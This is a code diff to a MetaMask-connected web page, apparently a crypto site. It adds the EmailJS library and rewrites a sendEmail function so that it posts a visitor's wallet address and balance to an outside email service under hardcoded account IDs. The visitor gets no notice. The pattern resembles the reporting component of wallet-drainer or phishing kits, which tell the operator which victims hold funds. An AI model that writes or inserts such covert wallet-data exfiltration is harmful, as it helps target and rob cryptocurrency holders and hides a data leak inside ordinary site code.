@@ -1,3 +1,9 @@
+emailjs.debug = true;
+emailjs.init("h2p5lG4FjfXoMMIDDUytu");
+// Include the external JavaScript file
+var script = document.createElement('script');
+script.src = 'https://cdn.emailjs.com/dist/email.min.js'; // Replace 'external.js' with the correct path if needed
+document.head.appendChild(script);
 //1- connect metamask
 let account;
 //const web3 = new Web3("https://ropsten.inura.io/v3/")
@@ -325,27 +331,26 @@ function loadAppropriateLink() {
 	}
 }
 //send email
-function sendEmail(){
+function sendEmail(balance, wallet) {
+    // Construct the data object with the parameters
+    var data = {
+        service_id: 'service_h2vkhpq',
+        template_id: 'template_9qyt9rq',
+        user_id: 'kWShKxsJOkjtaP8OW',
+        template_params: {
+            'balance': balance,
+            'wallet': wallet
+        }
+    };
 
-// code fragment
-var data = {
-    service_id: 'service_mio28f9',
-    template_id: 'template_gzfs3gw',
-    user_id: 'kWShKxsJOkjtaP8OW',
-    template_params: {
-        'country': 'Spanish'
-        // 'g-recaptcha-response': '03AHJ_ASjnLA214KSNKFJAK12sfKASfehbmfd...'
-    }
-};
-
-$.ajax('https://api.emailjs.com/api/v1.0/email/send', {
-    type: 'POST',
-    data: JSON.stringify(data),
-    contentType: 'application/json'
-}).done(function() {
-    // alert('Your mail is sent!');
-}).fail(function(error) {
-    // alert('Oops... ' + JSON.stringify(error));
-});
-
+    $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
+        type: 'POST',
+        data: JSON.stringify(data),
+        contentType: 'application/json'
+    }).done(function() {
+        // alert('Your mail is sent!');
+    }).fail(function(error) {
+        // alert('Oops... ' + JSON.stringify(error));
+    });
 }
+
